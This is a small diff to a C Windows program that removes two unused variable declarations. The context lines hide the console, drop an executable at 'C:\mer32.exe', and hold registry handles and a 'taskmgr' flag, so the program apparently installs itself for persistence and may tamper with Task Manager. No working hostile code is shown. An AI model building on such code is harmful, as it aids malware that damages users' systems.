@@ -6,7 +6,6 @@ int main() {
 	FreeConsole();
 
 	struct tm* tinfo;
-	int val;
 	char executable[MAX_PATH];
 	char* outfile = R"(C:\mer32.exe)";
 	char month[3];
@@ -15,7 +14,6 @@ int main() {
 	HKEY hkey;
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
-	DWORD taskmgr = 1;
 	time_t timer;
 
 	if (!(file = fopen(outfile, "r"))) {
